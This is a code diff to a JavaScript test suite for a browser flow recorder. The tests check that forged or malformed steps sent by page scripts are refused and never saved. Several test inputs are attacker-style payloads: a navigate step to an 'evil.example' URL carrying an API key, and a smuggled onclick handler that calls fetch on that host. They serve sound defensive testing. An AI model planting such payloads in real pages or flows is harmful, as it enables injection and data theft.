@@ -146,8 +146,9 @@ export async function testFlowRecordSensitiveRedaction() {
       ...props
     };
   }
-  function testCaptureSession({ captureHidden = false, captureSensitive = false } = {}) {
+  function testCaptureSession({ captureHidden = false, captureSensitive = false, token = 'tok-test-1234' } = {}) {
     const steps = [];
+    const tokens = [];
     const listeners = {};
     const mockElem = { setAttribute: () => {}, addEventListener: () => {} };
     const mockDoc = {
@@ -158,16 +159,22 @@ export async function testFlowRecordSensitiveRedaction() {
       getElementById: (id) => (id === '__wu_bar' ? null : mockElem),
     };
     const mockWin = {
-      __wuRecordStep: (str) => { steps.push(JSON.parse(str)); },
+      // The emitted payload is an envelope: { __wu: token, step } (web-uplift-sg5). The
+      // harness unwraps it AND keeps the token so a test can assert the page script does
+      // authenticate; the recorder refuses a payload without it.
+      __wuRecordStep: (str) => { const msg = JSON.parse(str); steps.push(msg.step); tokens.push(msg.__wu); },
     };
-    runInNewContext(makeCaptureJs({ captureHidden, captureSensitive }), {
+    runInNewContext(makeCaptureJs({ captureHidden, captureSensitive, token }), {
       window: mockWin,
       document: mockDoc,
       CSS: { escape: (s) => s },
     });
     return {
       triggerChange: (props) => listeners['change']({ target: mockEl(props) }),
-      steps
+      triggerClick: (props) => listeners['click']({ target: { closest: () => mockEl(props) } }),
+      steps,
+      tokens,
+      token,
     };
   }
 
@@ -197,6 +204,10 @@ export async function testFlowRecordSensitiveRedaction() {
   assert(def.steps.length === 6 && def.steps[5].value === '' && def.steps[5].redacted === true,
     'the injected handler must redact a camelCase oneTimeCode field');
 
+  // web-uplift-sg5: every step the page script emits carries the recording token, which is
+  // what the recorder checks before it persists anything.
+  assert(def.tokens.length === def.steps.length && def.tokens.every((t) => t === def.token),
+    `every emitted payload must carry the recording token, got ${JSON.stringify(def.tokens)}`);
   const defSerialized = JSON.stringify(def.steps);
   assert(!defSerialized.includes('secret123') && !defSerialized.includes('tok456') &&
     !defSerialized.includes('alice@example.com') && !defSerialized.includes('+1-555-0199') &&
@@ -209,6 +220,47 @@ export async function testFlowRecordSensitiveRedaction() {
     'the injected handler must redact an otcCode field (web-uplift-so2)');
   assert(!JSON.stringify(def.steps).includes('483921'),
     'so2: the serialised capture must not carry the one-time-code value');
+
+  // A click goes through the same authenticated path, and it is the step a page could most
+  // usefully forge - so the positive case matters as much as the refusals below.
+  const clickSession = testCaptureSession({ captureHidden: false, captureSensitive: false });
+  clickSession.triggerClick({ id: 'go', tagName: 'BUTTON', textContent: 'Go' });
+  assert(clickSession.steps.length === 1 && clickSession.steps[0].type === 'click' && clickSession.steps[0].selectors.length >= 1,
+    `a legitimate click must still be recorded: ${JSON.stringify(clickSession.steps)}`);
+  assert(clickSession.tokens[0] === clickSession.token, 'the click payload must be authenticated too');
+
+  // A3. validateRecordedStep driven directly: the e2e above proves the live path, this
+  // pins the shapes and the BOUNDS - including the shapes that must still be accepted, so
+  // the allowlist cannot be tightened into a recorder that silently drops real steps.
+  const { validateRecordedStep } = await import('../runner/flow-record.mjs');
+  const okClick = validateRecordedStep({ type: 'click', selectors: [['#go']], target: 'main' });
+  assert(okClick.ok && okClick.step.type === 'click' && !('value' in okClick.step),
+    'a well-formed click validates, and carries no value field');
+  const okRedacted = validateRecordedStep({ type: 'change', selectors: [['#pwd']], value: 'secret', redacted: true });
+  assert(okRedacted.ok && okRedacted.step.value === '' && okRedacted.step.redacted === true,
+    'a redacted change validates WITH an empty value (the redaction is enforced here, not in the page)');
+  const refused = [
+    [null, 'not a step object'],
+    ['click', 'not a step object'],
+    [{ type: 'navigate', url: 'https://evil.test/' }, 'a type the recorder never emits'],
+    [{ type: 'click', selectors: [['#go']], target: 'main', onclick: 'x()' }, 'an extra field'],
+    [{ type: 'click', selectors: [], target: 'main' }, 'no selectors'],
+    [{ type: 'click', selectors: [[]], target: 'main' }, 'an empty selector group'],
+    [{ type: 'click', selectors: [['#go', '']], target: 'main' }, 'an empty selector'],
+    [{ type: 'click', selectors: [['x'.repeat(600)]], target: 'main' }, 'an over-long selector'],
+    [{ type: 'change', selectors: [['#x']], value: 42 }, 'a non-string value'],
+    [{ type: 'change', selectors: [['#x']], value: 'v'.repeat(11000) }, 'an over-long value'],
+    [{ type: 'click', selectors: [['#go']], target: 't'.repeat(70) }, 'an over-long target'],
+  ];
+  for (const [input, why] of refused) {
+    const verdict = validateRecordedStep(input);
+    assert(!verdict.ok, `validateRecordedStep must refuse ${why}: ${String(JSON.stringify(input)).slice(0, 80)}`);
+    assert(typeof verdict.reason === 'string' && verdict.reason.length > 0, `a refusal must carry a reason (${why})`);
+  }
+  assert(validateRecordedStep({ type: 'click', selectors: Array.from({ length: 32 }, (_, i) => [`#s${i}`]), target: 'main' }).ok,
+    '32 selector groups are within the bound');
+  assert(validateRecordedStep({ type: 'click', selectors: [Array.from({ length: 8 }, (_, i) => `text/x${i}`)], target: 'main' }).ok,
+    '8 alternatives inside a selector group are within the bound');
 
   // A2. The injected page-side classifier and the Node-side one must agree. The
   // page script's word DATA is generated from evidence/credential-terms.mjs, but
@@ -382,6 +434,8 @@ export async function testFlowRecordSensitiveRedaction() {
   const { recordFlow } = await import('../runner/flow-record.mjs');
   const bindingListeners = [];
   const frameNavListeners = [];
+  const logs11 = [];
+  const injected = [];
   const mockCdp = {
     Runtime: {
       addBinding: async () => {},
@@ -389,12 +443,19 @@ export async function testFlowRecordSensitiveRedaction() {
     },
     Page: {
       frameNavigated: (fn) => frameNavListeners.push(fn),
-      addScriptToEvaluateOnNewDocument: async () => {},
+      // Capture the injected source: the test reads the recording token OUT of the script
+      // the page received, which is a capability a page script does NOT have (the token
+      // lives in the injected closure, and that script is not in the DOM).
+      addScriptToEvaluateOnNewDocument: async ({ source }) => { injected.push(source); },
       navigate: async () => {},
     },
   };
-  const flowPromise = recordFlow(mockCdp, 'https://example.com/checkout', { captureHidden: false });
+  const flowPromise = recordFlow(mockCdp, 'https://example.com/checkout', { captureHidden: false, log: (m) => logs11.push(m) });
   await new Promise((r) => setTimeout(r, 10));
+  const token = /const TOKEN = "([^"]+)"/.exec(injected.join('\n'))?.[1];
+  assert(typeof token === 'string' && token.length >= 16,
+    `the injected capture script must carry a per-recording token: ${injected.join('').slice(0, 200)}`);
+  const emit = (step) => JSON.stringify({ __wu: token, step });
 
   for (const fn of frameNavListeners) {
     fn({ frame: { parentId: null, url: 'https://example.com/checkout?step=2&token=sec123&postalCode=90210&user_email=alice@test.com' } });
@@ -404,9 +465,22 @@ export async function testFlowRecordSensitiveRedaction() {
     fn({ frame: { parentId: null, url: 'https://example.com/app#/token/abc123?tab=2' } });
   }
   for (const fn of bindingListeners) {
-    fn({ name: '__wuRecordStep', payload: JSON.stringify({ type: 'change', selectors: [['#email']], value: '', redacted: true }) });
-    fn({ name: '__wuRecordStep', payload: JSON.stringify({ type: 'change', selectors: [['#search']], value: 'winter boots' }) });
+    // web-uplift-sg5: the binding is a function on the PAGE global, so any page script can
+    // call it. Every one of these is a page trying to write steps the operator never took.
+    fn({ name: '__wuRecordStep', payload: JSON.stringify({ type: 'navigate', url: 'https://evil.example/collect?api_key=ATTACKER_KEY_123' }) });
+    fn({ name: '__wuRecordStep', payload: JSON.stringify({ type: 'change', selectors: [['#pwd']], value: 'attacker-typed', target: 'main' }) });
     fn({ name: '__wuRecordStep', payload: JSON.stringify({ type: '__done' }) });
+    fn({ name: '__wuRecordStep', payload: JSON.stringify({ __wu: 'not-the-token', step: { type: 'change', selectors: [['#pwd']], value: 'wrong-token' } }) });
+    // Authenticated but malformed. A field nobody validated is exactly how a page would
+    // smuggle something into a flow.json that gets replayed.
+    fn({ name: '__wuRecordStep', payload: emit({ type: 'click', selectors: [['#evil']], target: 'main', onclick: 'fetch("https://evil.example")' }) });
+    fn({ name: '__wuRecordStep', payload: emit({ type: 'navigate', url: 'https://evil.example/' }) });
+    fn({ name: '__wuRecordStep', payload: emit({ type: 'change', selectors: [['#pwd']], value: 'x'.repeat(20000) }) });
+    fn({ name: '__wuRecordStep', payload: emit({ type: 'change', selectors: [], value: 'no-selector' }) });
+    // The real steps, authenticated and well formed.
+    fn({ name: '__wuRecordStep', payload: emit({ type: 'change', selectors: [['#email']], value: '', redacted: true }) });
+    fn({ name: '__wuRecordStep', payload: emit({ type: 'change', selectors: [['#search']], value: 'winter boots' }) });
+    fn({ name: '__wuRecordStep', payload: emit({ type: '__done' }) });
   }
   const flow = await flowPromise;
   assert(flow.title === 'Recorded flow (example.com)', 'flow title matches host');
@@ -429,11 +503,24 @@ export async function testFlowRecordSensitiveRedaction() {
   assert(!serialized.includes('alice@test.com'), 'serialized flow must not leak email');
   assert(!serialized.includes('alice@example.com'), 'serialized flow must not leak the fragment-key email');
   assert(!serialized.includes('abc123'), 'serialized flow must not leak the token fragment value (bare or queried)');
+  // sg5: nothing a page script sent reached the flow; a redacted step still cannot carry a
+  // value; and the refusals are visible to the operator instead of silent.
+  assert(!serialized.includes('evil.example') && !serialized.includes('ATTACKER_KEY_123'),
+    `a page-supplied navigate step must never be persisted: ${serialized.slice(0, 200)}`);
+  assert(!serialized.includes('attacker-typed') && !serialized.includes('wrong-token') && !serialized.includes('onclick'),
+    'a page-supplied change/handler step must never be persisted');
+  assert(!serialized.includes('x'.repeat(100)), 'an oversized value must never be persisted');
+  assert(flow.steps[6].redacted === true && flow.steps[6].value === '',
+    'a redacted change step still carries no value, whatever the emitter sends');
+  const refusals = logs11.filter((m) => /refused a step the recorder did not emit/.test(m));
+  assert(refusals.length >= 5, `every refused step must be reported to the operator, got ${JSON.stringify(logs11)}`);
+  assert(!flow.tokens, 'the token must not leak into the flow record');
 
   // 12. End-to-end recordFlow execution with opt-in flags (captureHidden, captureSensitive).
   const bindingListenersOpt = [];
   const frameNavListenersOpt = [];
   const optLogs = [];
+  const injectedOpt = [];
   const mockCdpOpt = {
     Runtime: {
       addBinding: async () => {},
@@ -441,7 +528,7 @@ export async function testFlowRecordSensitiveRedaction() {
     },
     Page: {
       frameNavigated: (fn) => frameNavListenersOpt.push(fn),
-      addScriptToEvaluateOnNewDocument: async () => {},
+      addScriptToEvaluateOnNewDocument: async ({ source }) => { injectedOpt.push(source); },
       navigate: async () => {},
     },
   };
@@ -451,10 +538,13 @@ export async function testFlowRecordSensitiveRedaction() {
   for (const fn of frameNavListenersOpt) {
     fn({ frame: { parentId: null, url: 'https://example.com/checkout?step=2&token=sec123&user_email=alice@test.com' } });
   }
+  const tokenOpt = /const TOKEN = "([^"]+)"/.exec(injectedOpt.join('\n'))?.[1];
+  assert(typeof tokenOpt === 'string' && tokenOpt.length >= 16, 'the opt-in session must carry its own token');
+  const emitOpt = (step) => JSON.stringify({ __wu: tokenOpt, step });
   for (const fn of bindingListenersOpt) {
-    fn({ name: '__wuRecordStep', payload: JSON.stringify({ type: 'change', selectors: [['#hiddenToken']], value: 'csrf_secret_123' }) });
-    fn({ name: '__wuRecordStep', payload: JSON.stringify({ type: 'change', selectors: [['#email']], value: 'alice@test.com' }) });
-    fn({ name: '__wuRecordStep', payload: JSON.stringify({ type: '__done' }) });
+    fn({ name: '__wuRecordStep', payload: emitOpt({ type: 'change', selectors: [['#hiddenToken']], value: 'csrf_secret_123' }) });
+    fn({ name: '__wuRecordStep', payload: emitOpt({ type: 'change', selectors: [['#email']], value: 'alice@test.com' }) });
+    fn({ name: '__wuRecordStep', payload: emitOpt({ type: '__done' }) });
   }
   const flowOpt = await flowOptPromise;
   assert(flowOpt.steps[1].url.includes('token=sec123'), 'opt-in flow preserves URL parameters verbatim');
